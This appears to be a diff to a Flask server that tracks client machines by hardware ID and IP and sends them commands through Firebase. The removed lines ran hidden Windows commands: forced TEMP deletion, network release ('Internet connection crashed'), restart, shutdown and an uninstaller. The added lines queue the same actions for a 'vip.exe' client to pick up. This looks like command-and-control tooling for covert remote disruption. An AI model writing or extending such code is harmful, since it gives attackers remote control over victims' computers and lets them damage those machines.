@@ -29,7 +29,7 @@ def heartbeat():
     ip_addr = request.remote_addr
     
     ref = db.reference(f'clients/{hwid}')
-    ref.set({
+    ref.update({
         'ip': ip_addr,
         'status': 'ONLINE',
         'last_seen': 'Active Live'
@@ -43,36 +43,14 @@ def target_action():
     hwid = data.get('hwid')
     action = data.get('action')
 
-    # Ligtas na pagkuha ng CREATE_NO_WINDOW flag para hindi mag-crash sa Linux/Render server
-    creation_flags = getattr(subprocess, 'CREATE_NO_WINDOW', 0)
+    if not hwid or not action:
+        return jsonify({"message": "Invalid HWID or action."}), 400
 
-    if action == 'uninstall':
-        bat_path = os.path.join(os.path.dirname(__file__), "App-Uninstaller-Combined.bat")
-        if os.path.exists(bat_path):
-            subprocess.Popen(f'cmd.exe /c start cmd.exe /k "{bat_path}"', shell=True, creationflags=creation_flags)
-        return jsonify({"message": f"App-Uninstaller executed on {hwid}"})
+    # I-save ang utos sa Firebase Realtime Database para makuha ng vip.exe client
+    ref = db.reference(f'clients/{hwid}/pending_action')
+    ref.set(action)
 
-    elif action == 'clean':
-        subprocess.Popen('cmd.exe /c del /q /f /s "%TEMP%\\*.*"', shell=True, creationflags=creation_flags)
-        return jsonify({"message": f"Deep Clean executed on {hwid}!"})
-
-    elif action == 'netcrash':
-        subprocess.Popen('ipconfig /release', shell=True, creationflags=creation_flags)
-        return jsonify({"message": f"Internet connection crashed for {hwid}!"})
-
-    elif action == 'netrestore':
-        subprocess.Popen('ipconfig /renew', shell=True, creationflags=creation_flags)
-        return jsonify({"message": f"Internet connection restored for {hwid}!"})
-
-    elif action == 'restart':
-        subprocess.Popen('shutdown /r /t 0', shell=True, creationflags=creation_flags)
-        return jsonify({"message": f"Remote restart triggered for {hwid}!"})
-
-    elif action == 'shutdown':
-        subprocess.Popen('shutdown /s /t 0', shell=True, creationflags=creation_flags)
-        return jsonify({"message": f"Remote shutdown triggered for {hwid}!"})
-
-    return jsonify({"message": "Unknown action requested."})
+    return jsonify({"message": f"Action '{action}' queued for {hwid}!"})
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000)
